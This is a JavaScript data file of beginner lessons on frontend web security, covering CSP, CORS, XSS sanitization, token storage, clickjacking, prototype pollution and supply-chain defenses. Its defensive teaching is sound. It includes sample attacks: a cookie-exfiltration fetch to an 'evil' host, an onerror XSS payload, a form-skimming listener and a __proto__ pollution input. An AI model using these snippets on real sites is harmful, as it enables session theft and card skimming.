/* Teach me from the ground up: FE-SEC (auto-assembled) */
enh({
  "csp": {"teach":"<p>At its core, a <strong>Content Security Policy</strong> is just a note your server attaches to a web page that says: \"Browser, here is the exact list of places you're allowed to load scripts from — refuse everything else.\" The browser obeys that note, so even if an attacker manages to sneak their own <code>&lt;script&gt;</code> onto your page, the browser quietly refuses to run it because it isn't on the list.</p><h4>The shape of the note</h4><p>CSP is delivered as an HTTP response header named <code>Content-Security-Policy</code>. Its value is a list of <em>directives</em>, each naming a resource type and what's allowed for it:</p><ul><li><code>script-src</code> — where scripts may come from. This is the crown jewel; it's what stops injected JavaScript.</li><li><code>object-src 'none'</code> — bans Flash/plugin objects (a classic bypass vector).</li><li><code>base-uri 'none'</code> — stops an attacker rewriting the page's base URL to redirect relative script paths.</li><li><code>frame-ancestors</code> — who may put your page in an iframe (clickjacking defense).</li><li><code>connect-src</code> — which servers your page may phone home to (containing data exfiltration).</li></ul><h4>The strong modern form: nonces</h4><p>The robust 2026 policy uses a <strong>nonce</strong> — a random, unguessable string generated fresh for every single response. Your server stamps that nonce on each legitimate script tag (<code>&lt;script nonce=\"r4nd0m\"&gt;</code>) and lists it in the header. The browser only runs scripts carrying the matching nonce.</p><div class=\"analogy\">Think of a one-night-only nightclub where the password changes every night. The bouncer (browser) only admits people who whisper tonight's password (the nonce). An attacker who copied last night's password — or who's reading from a script printed before the password was chosen — simply can't get in. Because the nonce is unique per response, an injected inline script has no way to guess it.</div><p>Adding <code>'strict-dynamic'</code> tells modern browsers to trust scripts that a nonced script loads, and to ignore brittle host allowlists entirely — those allowlists were always one open CDN away from being bypassed.</p><h4>Why it matters — and the trap</h4><p>CSP is <strong>defense-in-depth</strong>: a second wall behind proper output encoding, not a substitute for it. It doesn't <em>prevent</em> the injection bug; it <em>limits the damage</em> if one slips through. The killer mistake is believing \"I have CSP, so I'm safe from XSS.\" If your policy contains <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code>, you've re-enabled the exact mechanisms XSS relies on — your CSP provides essentially no XSS protection at all.</p><div class=\"key\">CSP <em>contains</em> XSS, it does not <em>prevent</em> it. A strict nonce/hash policy with <code>'strict-dynamic'</code> is powerful; a policy with <code>'unsafe-inline'</code> is security theater.</div>"},
  "same-origin-policy": {"teach":"<p>At its core, the <strong>Same-Origin Policy</strong> is just the browser's house rule that says: \"Code running on one website cannot read the private data of a different website.\" Without this single rule, any random page you opened could silently read your bank balance from the bank tab next to it. It is the bedrock of all web security.</p><h4>What counts as an \"origin\"</h4><p>An origin is the precise combination of three things:</p><ul><li><strong>scheme</strong> — <code>http</code> vs <code>https</code></li><li><strong>host</strong> — <code>app.com</code> vs <code>api.app.com</code></li><li><strong>port</strong> — <code>:443</code> vs <code>:8080</code></li></ul><p>Change any one of those and you have a <em>different</em> origin. So <code>https://app.com</code> and <code>https://api.app.com</code> are different (different host); <code>http://app.com</code> and <code>https://app.com</code> are different (different scheme). The browser walls them off from each other's responses, cookies, and DOM.</p><div class=\"analogy\">Picture an apartment building where every flat has its own lock. The same key (your script) opens only the flat it belongs to. You can <em>slide a letter under</em> a neighbor's door (send a request), but you cannot walk in and <em>read</em> their mail (read the response). The lock is keyed to the full address — building, floor, and flat number — so being on the same street isn't enough.</div><h4>The crucial subtlety: reads vs sends</h4><p>SOP restricts <strong>reading</strong>, not all sending. Your page is perfectly free to <em>fire off</em> a request to another origin — the browser just won't let your JavaScript <em>read the answer</em>. This single fact explains two huge things:</p><ul><li><strong>Why CSRF exists:</strong> a forged <em>write</em> (\"transfer $1000\") can still be sent cross-origin — SOP never blocked sends, only reads.</li><li><strong>Why CORS exists:</strong> it's the official mechanism for a server to <em>selectively unlock</em> read access for specific friendly origins.</li></ul><h4>The trap: 'site' is not 'origin'</h4><p>These two boundaries look similar but are not the same. <strong>SameSite cookies</strong> use the looser notion of a <em>site</em> (eTLD+1, e.g. <code>app.com</code> covers all its subdomains). <strong>SOP</strong> uses the stricter <em>origin</em> (full scheme+host+port). Conflating them leads to reasoning errors: two subdomains are the same <em>site</em> but different <em>origins</em>.</p><div class=\"key\">SOP isolates by <code>scheme+host+port</code> and governs <em>reads</em>, not sends. That \"reads, not sends\" distinction is the key that unlocks correct reasoning about CORS, CSRF, postMessage, and iframes.</div>"},
  "cors": {"teach":"<p>At its core, <strong>CORS</strong> is just a server raising its hand and saying: \"These specific other websites are allowed to read what I send back.\" It's a way to <em>poke a hole</em> in the Same-Origin Policy on purpose — it loosens a wall, it never builds one.</p><h4>How the relaxation works</h4><p>Recall that SOP lets your page <em>send</em> a cross-origin request but blocks your JavaScript from <em>reading</em> the response. CORS lets the responding server override that block using response headers:</p><ul><li><code>Access-Control-Allow-Origin</code> — names the origin permitted to read the response.</li><li><code>Access-Control-Allow-Credentials: true</code> — also expose responses to requests that carried cookies.</li><li><code>Access-Control-Allow-Methods / -Headers</code> — what's permitted for non-trivial requests.</li></ul><p>For anything beyond a \"simple\" request, the browser first sends a <strong>preflight</strong> <code>OPTIONS</code> probe asking \"may I?\" before sending the real request.</p><div class=\"analogy\">CORS is a guest list at a private club, not a security guard. A security guard's job is to <em>keep people out</em>. A guest list's only job is to <em>let specific people in</em>. CORS can only ever <em>add</em> permission — it has no power to deny anything that SOP already allowed. If you're treating it as a lock, you've misunderstood the tool entirely.</div><h4>The console-error inversion</h4><p>This is the mental flip most people miss: when you see a <strong>\"CORS error\"</strong> in the console, CORS did not <em>fail</em> — it <em>protected you</em>. The browser blocked your script from reading a response the other server never authorized you to read. The error is the wall doing its job.</p><h4>The dangerous misconfiguration</h4><p>Because CORS is purely permissive, the real danger is being <em>too</em> permissive. The classic critical bug: the server <strong>reflects</strong> whatever <code>Origin</code> the request carried straight back into <code>Access-Control-Allow-Origin</code>, combined with <code>Access-Control-Allow-Credentials: true</code>. Now <em>any</em> website can read your users' authenticated responses. The spec forbids the literal wildcard <code>*</code> together with credentials, so attackers specifically rely on this <em>reflection</em> trick to dodge that rule.</p><p>For example, if <code>evil.com</code> makes a request and the server echoes <code>Access-Control-Allow-Origin: https://evil.com</code> plus <code>Allow-Credentials: true</code>, then evil.com's JavaScript can read the victim's logged-in <code>/account</code> JSON. Note too: CORS does <em>nothing</em> against CSRF, which is a write, not a read.</p><div class=\"key\">CORS is a deliberate <em>loosening</em> of SOP, never a security control. Reflecting <code>Origin</code> with <code>Allow-Credentials: true</code> hands authenticated data to any site — that's the bug to hunt for.</div>"},
  "dom-purify": {"teach":"<p>At its core, <strong>DOMPurify</strong> is just a bouncer for HTML: you hand it some untrusted markup, and it hands you back a cleaned-up version with all the dangerous bits — scripts, event handlers, sneaky URLs — removed, so it's safe to drop into your page.</p><h4>Why you need it</h4><p>Sometimes you genuinely must render real HTML that came from users or third parties: a comment formatted from Markdown, rich text from a CMS, an email body. You can't just escape it (that would show the user literal <code>&lt;b&gt;</code> tags), and you can't blindly trust it (that's how XSS gets in). You need something in between: keep the <em>safe</em> formatting, strip the <em>dangerous</em> behavior. That's sanitization.</p><h4>How it actually works — the allowlist</h4><p>DOMPurify doesn't try to <em>guess</em> what's dangerous. It does the opposite: it parses the markup into a real DOM tree (just like the browser would), then walks it and keeps only what's on an explicit <strong>allowlist</strong> of safe tags, attributes, and URL schemes. Anything not on the list — <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>javascript:</code> URLs — is discarded.</p><div class=\"analogy\">Think of airport security with a list of <em>permitted</em> items rather than a list of banned ones. A banned-items list (a blocklist) always loses: travelers invent something the list-writer never imagined. A permitted-items list (an allowlist) wins by default — if it's not explicitly allowed, it doesn't get through, including weapons nobody has invented yet. That's why <code>ALLOWED_TAGS</code> beats any \"forbidden tags\" approach.</div><h4>Two operational rules that bite people</h4><ul><li><strong>Sanitize at the last moment</strong> and don't re-process the output. If you sanitize, then re-serialize and re-parse the HTML, you can trigger <strong>mutation XSS (mXSS)</strong> — where the browser's own parser rearranges seemingly-clean markup back into something dangerous. Clean it right before insertion and insert it as-is.</li><li><strong>Keep it updated.</strong> Bypasses are discovered and patched regularly; an old DOMPurify is a known-vulnerable DOMPurify.</li></ul><h4>The trap: never roll your own</h4><p>The tempting mistake is writing a quick regex or blocklist to \"strip out scripts.\" HTML is far too irregular to match safely with regex — comments, malformed tags, nested quoting, and parser quirks give attackers endless bypasses. You will be defeated. Always use a parser-based allowlist sanitizer.</p><p>In practice: <code>el.innerHTML = DOMPurify.sanitize(userMarkdownHtml, {ALLOWED_TAGS:['b','i','a','p'], ALLOWED_ATTR:['href']})</code> keeps the bold and links but throws away an injected <code>&lt;img onerror=...&gt;</code>.</p><div class=\"key\">Sanitize untrusted HTML with a parser-based allowlist library, configured tightly, applied at the last moment, kept patched — and never hand-roll a regex sanitizer.</div>"},
  "trusted-types": {"teach":"<p>At its core, <strong>Trusted Types</strong> is the browser making you a promise it then <em>enforces</em>: \"I will refuse to let any plain string become live HTML or a live script unless that string first passed through your one approved cleaning function.\" It turns a discipline you used to enforce by hand in code review into a rule the platform guarantees.</p><h4>The problem it solves</h4><p>DOM-based XSS happens at <strong>sinks</strong> — dangerous functions like <code>innerHTML</code>, <code>script.src</code>, <code>eval</code>, and <code>document.write</code>. A real app has <em>thousands</em> of places that could touch one of these. Auditing every single one, forever, is hopeless — one missed assignment is a vulnerability. Trusted Types collapses that impossible review into a tiny, auditable choke point.</p><h4>How it works</h4><p>You switch it on via a CSP directive: <code>require-trusted-types-for 'script'</code>. The moment it's active, assigning a raw string to a dangerous sink <strong>throws a TypeError</strong>. The only values the browser will accept are special typed objects — <code>TrustedHTML</code>, <code>TrustedScript</code> — and the <em>only</em> way to mint those is through a <strong>policy</strong> you registered. A policy named <code>default</code> is automatically applied to any stray string assignment you didn't explicitly route.</p><div class=\"analogy\">Imagine a bank where the vault door physically cannot open for loose cash — it only accepts bills sealed in tamper-evident bags from the counting room. Suddenly you don't have to inspect every employee at every door; you just have to trust one counting room. Audit that one room and the whole bank is secure. The sinks are the vault door; your policy is the counting room; <code>TrustedHTML</code> is the sealed bag.</div><h4>The trap you must not fall into</h4><p>Trusted Types does <strong>not sanitize anything for you</strong>. It only enforces that values <em>came from a policy</em> — it never checks whether the policy actually cleaned them. If your policy function just returns the string untouched, you've enforced nothing useful. <strong>Your policy must call DOMPurify (or equivalent)</strong> to do the real cleaning:</p><p><code>const p = trustedTypes.createPolicy('default', {createHTML: s =&gt; DOMPurify.sanitize(s)}); el.innerHTML = p.createHTML(dirty);</code></p><p>After that, a direct <code>el.innerHTML = dirty</code> throws — the platform now forces every dangerous assignment through your sanitizing choke point.</p><h4>Why it's safe to adopt now</h4><p>As of early 2026 Trusted Types is <strong>Baseline</strong>: Chrome/Edge since 2020, Safari 26 (2025), Firefox (2026). Where unsupported, it degrades gracefully — your code still runs — so it <em>complements</em> sanitization rather than replacing it.</p><div class=\"key\">Trusted Types converts \"remember to sanitize every sink\" from a fragile human habit into a browser-enforced invariant — but the actual cleaning still happens inside <em>your</em> policy, which must call a real sanitizer.</div>"},
  "token-storage": {"teach":"<p>At its core, deciding where to keep a user's login token is just choosing <em>which</em> attack you'd rather defend against — because every storage choice trades one risk for another. There is no \"perfectly safe\" spot, only a smarter or dumber trade.</p><h4>The two contenders</h4><p><strong>localStorage</strong> is a JavaScript-readable box. Any script on your page can read it with <code>localStorage.getItem('token')</code> — and so can any <em>attacker's</em> script if XSS gets in (even via a single compromised npm dependency). One XSS bug and the token is exfiltrated, giving full, persistent account takeover. The upside: cookies aren't involved, so there's no CSRF risk.</p><p>An <strong>HttpOnly + Secure + SameSite cookie</strong> is the mirror image. The <code>HttpOnly</code> flag makes it <em>invisible to JavaScript</em> entirely — it never appears in <code>document.cookie</code> — so even a full XSS can't read it. But the browser <em>auto-attaches</em> it to every request to your domain, which is exactly the behavior CSRF abuses, so you must add CSRF protection.</p><div class=\"analogy\">localStorage is keeping your house key under the doormat: handy, and <em>you</em> never get locked out — but anyone who walks up (any script) can grab it and now <em>owns</em> your house. An HttpOnly cookie is a key sealed inside a tamper-proof tube the postman carries for you: a pickpocket (XSS) can't extract it from the tube — but because the postman delivers it automatically to whoever asks at your address, a con artist can trick the postman into delivering it on a forged errand (CSRF). You stop the con with a secret handshake the con artist doesn't know: the CSRF token.</div><h4>Why the common 'shortcut' is the wrong trade</h4><p>People say \"I'll use localStorage because it avoids CSRF.\" But look at the sizes of the two risks. CSRF is a <em>narrow</em>, well-understood threat with mature, cheap mitigations (tokens, SameSite). \"Any XSS equals total credential theft\" is a <em>broad</em>, catastrophic threat with no second line of defense once the token leaks. You'd be trading away a small, easily-patched risk to take on a large, unbounded one. That's backwards.</p><h4>The senior recommendation</h4><p>Use <strong>HttpOnly + Secure + SameSite cookies plus CSRF tokens</strong>. If your architecture truly needs a bearer token, keep a <em>short-lived access token in memory</em> (gone when the tab closes, never written to disk) and refresh it via the HttpOnly cookie. <strong>Long-lived refresh tokens must never sit in localStorage</strong> — that's the worst of both worlds.</p><p>The payoff is concrete: with <code>Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax</code>, an XSS payload running <code>fetch('//evil/'+document.cookie)</code> exfiltrates nothing, because the session simply isn't in <code>document.cookie</code>.</p><div class=\"key\">Token storage is an XSS-vs-CSRF trade. HttpOnly cookies + CSRF tokens beats localStorage, because it swaps a large, unmitigable risk (any XSS steals the credential) for a small, well-solved one (CSRF).</div>"},
  "clickjacking": {"teach":"<p>At its core, <strong>clickjacking</strong> is just an attacker putting your real website inside an invisible window on <em>their</em> page, then tricking the user into clicking your buttons while the user thinks they're clicking something completely different.</p><h4>How the trick works</h4><p>The attacker loads your genuine site in a transparent or carefully-positioned <code>&lt;iframe&gt;</code> layered over their own decoy content. The user sees, say, a tempting \"Win a prize!\" button. But that button is invisibly sitting right on top of your site's real <em>\"Transfer money\"</em> or <em>\"Delete account\"</em> button. The click lands on <em>your</em> UI — fully authenticated, because it's the user's real session — but the user had no idea what they actually pressed. The name comes from \"UI redress\": the attacker redresses your interface to look like something harmless.</p><div class=\"analogy\">It's like a con artist who slides a transparent sheet over a contract. You see and read \"Sign up for our free newsletter,\" but the line you actually sign sits beneath it on a document that says \"I authorize this withdrawal.\" Your hand, your real signature — but applied to a page you never meant to sign. The defense isn't to read more carefully; it's to make the document physically refuse to be stacked under another sheet.</div><h4>The authoritative defense in 2026</h4><p>The reliable control is a server-sent header — the CSP directive <strong><code>frame-ancestors</code></strong>:</p><ul><li><code>frame-ancestors 'none'</code> — your page may never be framed by anyone.</li><li><code>frame-ancestors 'self'</code> — only your own site may frame it.</li><li><code>frame-ancestors https://partner.com</code> — explicit allowlist of trusted embedders.</li></ul><p>This <em>supersedes</em> the legacy <code>X-Frame-Options</code> header, though you should still set <code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code>) for very old browsers. Crucially, <code>frame-ancestors</code> is the only one that supports multi-origin allowlisting.</p><h4>The trap: JavaScript frame-busting</h4><p>An old technique is \"frame-busting\" JavaScript — code that checks <code>if (top !== self)</code> and tries to break out of the frame. <strong>Do not rely on this.</strong> An attacker can load your page in a <strong>sandboxed iframe</strong> with scripts disabled, or without <code>allow-top-navigation</code> permission, and your frame-busting code simply never runs or can't navigate. Only a server header can't be defeated this way, because the browser enforces it before your page even renders.</p><p>With <code>Content-Security-Policy: frame-ancestors 'none'</code>, the browser refuses to render your page inside <em>any</em> iframe at all — so the overlay attack can never even load your UI.</p><div class=\"key\">Defend against clickjacking with the server header <code>frame-ancestors</code> (plus <code>X-Frame-Options</code> for legacy clients). JavaScript frame-busting is bypassable by a sandboxed iframe and must never be your only control.</div>"},
  "prototype-pollution": {"teach":"<p>At its core, <strong>prototype pollution</strong> is tricking your JavaScript into writing a property onto the shared blueprint that <em>every</em> object inherits from — so a value the attacker plants quietly shows up on objects all across your app, including ones the attacker never touched.</p><h4>The one fact you need: shared inheritance</h4><p>In JavaScript, almost every plain object inherits from a single shared parent: <code>Object.prototype</code>. If something writes <code>Object.prototype.isAdmin = true</code>, then <em>every</em> plain object in the program suddenly reports <code>obj.isAdmin === true</code> by inheritance — even objects created long before. That shared parent is the blast radius.</p><h4>How attackers reach it</h4><p>The vulnerability lives in unsafe <strong>recursive merge / clone / deep-set</strong> functions — the kind that walk a nested object and copy keys. Feed one a key like <code>__proto__.isAdmin</code> from attacker-controlled JSON, and instead of setting a normal property, the merge follows <code>__proto__</code> straight to <code>Object.prototype</code> and writes there. This has produced a long string of CVEs in lodash, jQuery plugins, and query-string parsers.</p><div class=\"analogy\">Imagine a print shop where every blank form is photocopied from one master template in a locked drawer. An attacker who scribbles \"APPROVED\" onto that master template doesn't change one form — every form printed afterward, by anyone, now says \"APPROVED.\" <code>Object.prototype</code> is the master template; <code>__proto__</code> is the unlocked back door into the drawer.</p></div><h4>Why it's more than a flipped flag</h4><p>Sometimes the injected property directly flips a security check (<code>isAdmin</code>). But the nastier escalation is a <strong>gadget</strong>: some library later reads a config option <em>off the prototype</em> — say a template engine that checks for an <code>options.allowUnsafe</code>-style flag — and the polluted value turns that into <strong>DOM XSS</strong>. The pollution becomes the first link in a chain that ends in code execution.</p><h4>The trap: \"that's a server-only bug\"</h4><p>Many engineers assume prototype pollution is just a Node.js problem. It absolutely happens <em>in the browser</em> too, where it can corrupt application state and chain into DOM XSS through library gadgets. Treat client-side merges of untrusted data as just as dangerous.</p><h4>Defenses</h4><ul><li>Strip the dangerous keys <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> before merging untrusted data.</li><li>Use <code>Object.create(null)</code> or a <code>Map</code> for untrusted key/value data — these have no <code>Object.prototype</code> to pollute.</li><li>Optionally <code>Object.freeze(Object.prototype)</code> to make it un-writable.</li><li>Keep merge libraries patched.</li></ul><p>The minimal demonstration: <code>merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))</code> then <code>({}).polluted</code> returns <code>true</code> — a brand-new empty object inherited the attacker's property.</p><div class=\"key\">Prototype pollution writes onto <code>Object.prototype</code> via keys like <code>__proto__</code> in unsafe merges, leaking into every object — and it bites in the browser too, where library gadgets can escalate it to DOM XSS.</div>"},
  "sri": {"teach":"<p>At its core, <strong>Subresource Integrity</strong> is just attaching a fingerprint to an external script tag so the browser can check, before running it, that the file's bytes are <em>exactly</em> what you expected — and refuse to run it if even one byte was changed.</p><h4>How the fingerprint works</h4><p>You add an <code>integrity</code> attribute containing a cryptographic hash of the file you trust:</p><p><code>&lt;script src=\"https://cdn/lib.js\" integrity=\"sha384-…\" crossorigin=\"anonymous\"&gt;</code></p><p>When the browser downloads <code>lib.js</code>, it computes the SHA-384 hash of the bytes it actually received and compares it to the hash you pinned. Match? It runs. Mismatch? It blocks execution entirely. The <code>crossorigin=\"anonymous\"</code> attribute is required so the browser is allowed to read the cross-origin bytes well enough to hash them.</p><div class=\"analogy\">It's like a tamper-evident seal on a medicine bottle, but mathematically perfect. The pharmacy (your HTML) prints the exact seal pattern on your prescription slip. When the bottle arrives from the warehouse (the CDN), you compare seals. If the warehouse was burgled and the pills swapped, the seal won't match and you refuse to take them — without ever needing to trust the warehouse itself. A single changed pill breaks the seal.</div><h4>The threat it stops</h4><p>SRI defends against a <strong>compromised CDN</strong>. You load a popular library from a third-party CDN; an attacker breaches that CDN and swaps the file for a malicious version. Without SRI, your users silently run the attacker's code. With SRI, the hash mismatch blocks it cold.</p><h4>Requiring SRI everywhere</h4><p>To <em>mandate</em> that integrity metadata is present (not just honored when supplied), use the modern <code>Integrity-Policy</code> response header. Note the old CSP <code>require-sri-for</code> directive is obsolete and removed — don't reach for it.</p><h4>The trap: SRI is not supply-chain security</h4><p>This is the misconception that matters. SRI verifies <em>one specific file's bytes</em> against <em>one pinned hash</em> — nothing more. It is blind to:</p><ul><li><strong>Build-time compromise:</strong> if a poisoned dependency gets baked into your bundle, you compute the hash <em>of the already-malicious bundle</em>. SRI happily verifies the malware.</li><li><strong>Dynamically loaded code:</strong> scripts injected after page load aren't covered by your pinned tags.</li></ul><p>So SRI is <em>one layer</em> of supply-chain defense — the \"did the CDN tamper with this exact file?\" layer — paired with lockfiles, version pinning, and CSP for the rest.</p><div class=\"key\">SRI cryptographically guarantees a fetched file matches the exact bytes you pinned, defeating a hacked CDN — but a malicious dependency compiled into your bundle passes SRI fine, so it's one layer, not whole-supply-chain security.</div>"},
  "supply-chain": {"teach":"<p>At its core, <strong>frontend supply-chain risk</strong> is the simple, uncomfortable fact that every piece of code you didn't write — every npm package, every analytics tag, every CDN script — <em>runs inside your app with your app's privileges</em>. So if any one of them turns hostile, that's not just <em>their</em> problem; it's a full compromise of <em>you</em>.</p><h4>The two attack surfaces</h4><p><strong>1. Build-time dependencies.</strong> Your app pulls in dozens of direct npm packages, which pull in hundreds of <em>transitive</em> ones. A <strong>malicious or hijacked package</strong> — a typosquat (<code>reqeust</code> instead of <code>request</code>), a compromised maintainer account, or a sneaky post-install script — runs with your build's privileges. It can inject code into your shipped bundle or steal build secrets.</p><p><strong>2. Runtime third-party scripts.</strong> Every <code>&lt;script&gt;</code> tag you embed — ads, analytics, chat widgets — runs <em>in your origin</em> with full access to your DOM, your forms, and your cookies. This is the <strong>Magecart</strong> pattern: attackers compromise a third-party tag and skim credit-card data straight off checkout forms.</p><div class=\"analogy\">Hiring dependencies is like giving every contractor a master key to your house. You vetted the plumber, but the plumber subcontracted an electrician, who subcontracted a painter you've never met — and all three now hold copies of your master key. The painter only needs to turn malicious <em>once</em>. \"Transitive dependency\" just means \"a key-holder you never personally hired.\"</div><h4>The trap: 'popular means safe'</h4><p>The dangerous instinct is to trust the registry and assume a package with millions of downloads must be fine. It's exactly backwards: <strong>popular packages are hijacked <em>because</em> they're high-leverage</strong>. One compromise of a widely-depended-on library reaches thousands of apps at once — so attackers target precisely those. Assume <em>any</em> dependency can turn hostile.</p><h4>Layered defenses</h4><ul><li><strong>Lock and pin:</strong> commit lockfiles, pin versions, use <code>npm ci</code> (which verifies integrity against the lockfile rather than re-resolving).</li><li><strong>Review and inventory:</strong> dependency-diff review on updates, SCA tooling, and SBOMs to know exactly what you ship.</li><li><strong>Reduce attack surface:</strong> disable install scripts where feasible, and ruthlessly minimize your dependency count — the smallest dependency tree is the safest.</li><li><strong>Verify CDN assets:</strong> SRI (enforced via <code>Integrity-Policy</code>) blocks an altered file.</li><li><strong>Contain the blast radius:</strong> a strict CSP — especially <code>connect-src</code> (where data may be sent) and <code>frame-ancestors</code> — limits what a compromised script can do even after it's running.</li></ul><p>Concretely: a hijacked analytics tag adds <code>document.forms[0].addEventListener('submit', exfil)</code> to skim card data. A strict <code>connect-src</code> blocks its exfil endpoint; SRI would have blocked the altered file in the first place. Defense in depth catches what any single layer misses.</p><div class=\"key\">Every dependency and third-party tag executes with your app's full privileges, so any one can compromise you — and \"popular\" is a target, not a guarantee. Defend in layers: pin/lock, minimize, SRI, and a strict CSP to cap the blast radius.</div>"},
  "security-headers": {"teach":"<p>At its core, <strong>security response headers</strong> are just a handful of instructions you attach to every HTTP response that tell the browser \"be stricter than your defaults\" — and the browser obeys them for free, hardening your app with zero changes to your application logic.</p><h4>The core set a senior ships by default</h4><ul><li><strong>CSP</strong> (<code>Content-Security-Policy</code>) — defense-in-depth against XSS and clickjacking by constraining what can load and run.</li><li><strong>HSTS</strong> (<code>Strict-Transport-Security</code>) — forces the browser to use HTTPS for your domain, defeating SSL-strip downgrade attacks.</li><li><strong><code>X-Content-Type-Options: nosniff</code></strong> — stops the browser from \"MIME-sniffing,\" i.e. guessing a file is a script when you served it as data. Sniffing can turn an uploaded text file into executable JavaScript.</li><li><strong><code>Referrer-Policy</code></strong> (e.g. <code>strict-origin-when-cross-origin</code>) — limits how much of your URL leaks to other sites, so tokens or IDs embedded in URLs don't leak in the <code>Referer</code> header.</li><li><strong><code>Permissions-Policy</code></strong> — switches off powerful browser features (camera, geolocation, USB) your site doesn't use, shrinking the attack surface.</li></ul><div class=\"analogy\">Think of these as the safety settings on a new appliance. Out of the box the browser ships in a permissive, backward-compatible \"works with everything\" mode. Security headers are you flipping the row of hardening switches the manufacturer left off for compatibility: \"only run on the grounded outlet\" (HSTS), \"don't guess what's plugged in\" (nosniff), \"don't broadcast where you came from\" (Referrer-Policy). Each switch is cheap; together they remove whole classes of accidents.</div><h4>Two modern housekeeping notes</h4><ul><li><code>frame-ancestors</code> inside CSP now <strong>supersedes</strong> the legacy <code>X-Frame-Options</code> header — though you still set XFO (<code>DENY</code>/<code>SAMEORIGIN</code>) for very old clients.</li><li><code>X-XSS-Protection</code> is <strong>deprecated</strong>. Chrome removed its XSS Auditor back in 2019, and the header could even introduce bugs. Omit it or explicitly set <code>0</code>.</li></ul><h4>The trap: meta tags don't count</h4><p>The mistake that quietly nullifies your hardening: putting these in an HTML <code>&lt;meta&gt;</code> tag. <strong>Most security headers — HSTS, <code>X-Frame-Options</code>, <code>nosniff</code> — are ignored when delivered as meta tags.</strong> They <em>must</em> be real HTTP response headers, set at your server or edge/CDN. (Only CSP has limited meta-tag support, and even then with restrictions.) If you can't see the header in the network tab's response headers, it isn't doing anything.</p><p>A concrete payoff: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code> means that after the first HTTPS visit, the browser <em>refuses</em> to ever speak to your site over plain HTTP — slamming the door on downgrade and SSL-strip attacks for a full year.</p><div class=\"key\">A small, standard set of <em>real</em> HTTP response headers (CSP, HSTS, nosniff, Referrer-Policy, Permissions-Policy) hardens the browser for free — but only as genuine headers set at the server/edge, never as <code>&lt;meta&gt;</code> tags.</div>"},
  "dangerously-set-inner-html": {"teach":"<p>At its core, <code>dangerouslySetInnerHTML</code> (and Vue's <code>v-html</code>, Angular's <code>[innerHTML]</code>) is the framework's <em>escape hatch</em> — a deliberate way to inject raw HTML that <strong>turns off</strong> the automatic escaping that normally keeps you safe. The word \"dangerously\" is not decoration; it's a warning label.</p><h4>Why the escape hatch exists</h4><p>Modern frameworks auto-escape everything you interpolate. If you write <code>&lt;div&gt;{userComment}&lt;/div&gt;</code> and the comment is <code>&lt;img src=x onerror=steal()&gt;</code>, React renders it as <em>visible text</em> — the literal characters — not as a live tag. That auto-escaping is why XSS is rare in framework apps. So XSS almost always sneaks in through the one door where escaping is deliberately disabled: the raw-HTML escape hatch, used when you genuinely need to render real markup (sanitized rich text, rendered Markdown).</p><div class=\"analogy\">Your framework is a kitchen with an automatic filter on the tap — every drop of water is purified before it reaches your glass. <code>dangerouslySetInnerHTML</code> is the unfiltered bypass valve behind the sink, there for when you need raw water for non-drinking purposes. Opening that valve is fine — but the instant you do, <em>you</em> are responsible for purifying the water yourself. Blaming the kitchen for bad water from the bypass valve misses the point: you opened the bypass.</div><h4>An important per-framework distinction</h4><ul><li><strong>React <code>dangerouslySetInnerHTML</code></strong> and <strong>Vue <code>v-html</code></strong> perform <strong>zero sanitization</strong>. Whatever string you pass is injected as-is. The protection is entirely yours.</li><li><strong>Angular <code>[innerHTML]</code></strong> actually <em>does</em> run a built-in sanitizer by default — unless you defeat it by calling <code>bypassSecurityTrustHtml</code>, at which point you're back to owning the risk.</li></ul><p>The trap is assuming the framework \"still has your back\" inside the escape hatch. For React and Vue it explicitly does not — opting out of escaping was the entire purpose of the call.</p><h4>How to use it safely</h4><p>Use it only for genuine rich-markup needs, and <strong>always pass the output of a real sanitizer</strong>, applied as close to render as possible:</p><p><code>&lt;div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(comment)}} /&gt;</code></p><p>Without that <code>DOMPurify.sanitize</code> call, <code>comment = '&lt;img src=x onerror=steal()&gt;'</code> executes the attacker's code. For belt-and-suspenders, layer <strong>Trusted Types</strong> on top so the <em>platform</em> enforces that only a vetted policy can ever produce HTML reaching these sinks — turning \"I promise to sanitize\" into a rule the browser checks.</p><div class=\"key\">The raw-HTML escape hatch deliberately disables auto-escaping, so in React/Vue you own sanitization completely — always wrap the value in <code>DOMPurify.sanitize(...)</code>, and back it with Trusted Types for platform-level enforcement.</div>"}
});
